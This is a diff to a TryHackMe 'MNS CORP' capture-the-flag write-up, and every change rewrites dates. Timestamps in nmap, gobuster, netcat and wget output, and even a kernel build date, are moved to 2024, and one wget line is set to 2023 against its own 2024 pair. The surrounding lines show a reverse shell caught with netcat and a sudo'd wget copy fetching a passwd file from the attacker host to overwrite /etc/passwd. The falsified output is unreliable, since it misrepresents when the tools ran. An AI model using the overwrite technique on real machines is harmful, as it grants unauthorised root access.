@@ -1,7 +1,7 @@
 ---
 title: MNS CORP - TryHackMe
 author: Vishnu Sudhakaran
-date: 2023-02-15 21:00:00 +0530
+date: 2024-03-10 21:00:00 +0530
 categories: [Boot2Root, TryHackMe]
 tags: [ easy, rce, privesc, linux, gtfobin ]
 ---
@@ -20,7 +20,7 @@ We can start with `nmap` scan.
 
 ```bash
 ➜ nmap -sC -sV 10.10.209.251 --min-rate 1000                               
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-13 21:41 IST
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-02 21:41 IST
 Nmap scan report for 10.10.209.251
 Host is up (0.40s latency).
 Not shown: 996 closed tcp ports (conn-refused)
@@ -86,7 +86,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] Extensions:              php,js
 [+] Timeout:                 10s
 ===============================================================
-2023/02/13 22:19:51 Starting gobuster in directory enumeration mode
+2024/03/02 22:19:51 Starting gobuster in directory enumeration mode
 ===============================================================
 /.hta.php             (Status: 403) [Size: 278]
 /.hta                 (Status: 403) [Size: 278]
@@ -104,7 +104,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /server-status        (Status: 403) [Size: 278]                                   
                                                                                   
 ===============================================================
-2023/02/13 22:29:48 Finished
+2024/03/02 22:29:48 Finished
 ===============================================================
 ```
 
@@ -136,7 +136,7 @@ We have successfully get the reverse shell as `www-data`. Let's check for sudo p
 ➜  nc -lnvp 1335
 listening on [any] 1335 ...
 connect to [10.4.29.202] from (UNKNOWN) [10.10.209.251] 46108
-Linux 0717c3460eb4 4.15.0-142-generic #146-Ubuntu SMP Tue Apr 13 01:11:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+Linux 0717c3460eb4 4.15.0-142-generic #146-Ubuntu SMP Tue Mar 02 01:11:19 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
  23:43:13 up  2:09,  0 users,  load average: 0.01, 0.01, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)
@@ -464,14 +464,14 @@ Now run `python` HTTP server for transferring this file into target machine.
 ```bash
 ➜  python -m SimpleHTTPServer 8000
 Serving HTTP on 0.0.0.0 port 8000 ...
-10.10.194.136 - - [14/Feb/2022 20:43:49] "GET /passwd HTTP/1.1" 200 -
+10.10.194.136 - - [02/Mar/2024 20:43:49] "GET /passwd HTTP/1.1" 200 -
 
 ```
 
 ```bash
 Mid_PrivShell $: ./odus -O /etc/passwd http://10.4.29.202:8000/passwd
 ./odus -O /etc/passwd http://10.4.29.202:8000/passwd
---2022-02-14 20:43:50--  http://10.4.29.202:8000/passwd
+--2023-03-02 20:43:50--  http://10.4.29.202:8000/passwd
 Connecting to 10.4.29.202:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 1457 (1.4K) [application/octet-stream]
@@ -479,7 +479,7 @@ Saving to: ‘/etc/passwd’
 
 /etc/passwd         100%[===================>]   1.42K  --.-KB/s    in 0.001s  
 
-2022-02-14 20:43:50 (1.51 MB/s) - ‘/etc/passwd’ saved [1457/1457]
+2024-03-02 20:43:50 (1.51 MB/s) - ‘/etc/passwd’ saved [1457/1457]
 
 Mid_PrivShell $: 
 
